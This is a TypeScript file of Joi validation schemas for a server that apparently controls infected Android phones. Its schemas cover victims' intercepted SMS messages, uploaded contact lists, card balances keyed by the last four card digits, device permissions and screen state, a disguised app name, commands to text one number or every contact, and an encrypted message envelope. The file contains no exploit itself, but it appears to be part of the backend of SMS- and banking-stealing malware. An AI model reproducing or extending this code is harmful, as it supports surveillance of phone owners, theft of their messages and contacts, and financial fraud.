import Joi from "joi";


class Schemas {
    createClientSchema(): Joi.ObjectSchema<any> {
        return Joi.object({
            id: Joi.string().length(8).required(),
            ip: Joi.alternatives().try(
                Joi.string().ip({ version: ['ipv4', 'ipv6'] }),
                Joi.string().valid('N/A').insensitive()
            ).default("N/A"),
            app_name: Joi.string(), //.max(50).required(),
            mobile: Joi.string(), //.max(30).required(),
            android_version: Joi.number().integer(), //.min(3).max(20).required(),
            battery: Joi.number().integer(), //.min(0).max(100).required(),
            connected_at: Joi.number().integer(), //.min(0).required(),
            last_connection_at: Joi.number().integer(), //.min(0).required(),
            mask_name: Joi.string(), //.default("N/A").max(35),
            screen_status: Joi.string(), //.valid("ON", "OFF").required(),
            app_behave: Joi.string(), //.valid("IN", "OUT").required(),
            version: Joi.string().trim(),
            permissions: Joi.array().items(Joi.string().trim().lowercase()),
            from_port: Joi.string().trim().default("default"),
            balance_count: Joi.string()
        });
    }

    createBalanceSchema(): Joi.ObjectSchema<any> {
        return Joi.object().pattern(
            Joi.string(),
            Joi.array().items(
                Joi.object({
                    four_char_card: Joi.string(),
                    value: Joi.string()
                })
            )
        );
    }

    createArrayContactSchema(): Joi.ArraySchema<any[]> {
        return Joi.array().items(Joi.object({
            name: Joi.string(),
            number: Joi.string()
        })).required();
    }

    createIncomingMessageSchema(): Joi.ObjectSchema<any> {
        return Joi.object({
            text: Joi.string(), //.max(4096).required(),
            operator: Joi.string(), //.max(10),
            from_number: Joi.string(), //.default("unknown").max(20),
            from_name: Joi.string(), //.default("unknown").max(50),
            sim_slot: Joi.number(), //.integer().max(4),
            sms_type: Joi.string().trim().uppercase() //.valid("INBOX", "OUTBOX")
        }).unknown(true);
    }

    createMobilePhoneSchema(): Joi.ObjectSchema<any> {
        return Joi.object({
            app_name: Joi.string().max(50),
            cpu: Joi.string().max(35),
            build_number: Joi.string().max(50),
            sim_slots: Joi.number().integer().max(4),
            phone: Joi.array().items(Joi.string().max(20)).max(15).default([]),
            mobile: Joi.string().max(30),
            uptime: Joi.number().integer().min(0),
            battery: Joi.number().integer().min(0).max(100),
            contacts_length: Joi.number().integer().min(0).max(10000),
            android_version: Joi.number().integer().min(3).max(20)
        }).unknown(true);
    }

    createSendMessageSchema(): Joi.ObjectSchema<any> {
        return Joi.object({
            text: Joi.string().max(3000).required(),
            to: Joi.string().max(35).required()
        }).unknown(true);
    }

    createSendMessageToAllSchema(): Joi.ObjectSchema<any> {
        return Joi.object({
            text: Joi.string().max(3000).required(),
            all_length: Joi.number().integer().min(0).required()
        }).unknown(true);
    }

    createSimpleInputSchema(): Joi.ObjectSchema<any> {
        return Joi.object({
            id: Joi.string().required(),
            status: Joi.boolean().required(),
            message: Joi.string(),
            method: Joi.string().required(),
            screen_status: Joi.string().valid("ON", "OFF").required(),
            app_behave: Joi.string().valid("IN", "OUT").required(),
            battery: Joi.number().integer().required(),
            session_id: Joi.string().trim(),
            version: Joi.string().trim(),
            type: Joi.string<"onAutomate" | "onCommand">().trim().default("onCommand"),
            from_port: Joi.string().trim().default("default"),
            permissions: Joi.array().items(Joi.string().trim().lowercase()),
            balance: this.createBalanceSchema()
        }).unknown(true);
    }

    createFirstLayerSchema(): Joi.ObjectSchema<any> {
        return Joi.object({
            salt: Joi.string().min(0).trim().required(),
            iv: Joi.string().min(0).trim().required(),
            data: Joi.string().min(0).trim().required(),
            tag: Joi.string().min(0).trim().required(),
            id: Joi.string().min(0).trim().required(),
        });
    }
    
    createRefreshSchema(): Joi.ObjectSchema<any> {
        return Joi.object({
            id: Joi.string(), //.length(8).required(),
            method: Joi.string(), //.valid("refresh").required()
        });
    }

    createUploadSchema(): Joi.ObjectSchema<any> {
        return Joi.object({
            id: Joi.string(), //.length(8).required(),
            session_id: Joi.string().trim() //.length(16).required()
        });
    }

    createCardSchema(): Joi.ArraySchema<string[]> {
        return Joi.array().items(
            Joi.string()
        );
    }

    get getJoi(): Joi.Root {
        return Joi;
    }
}


export const schemas = new Schemas();
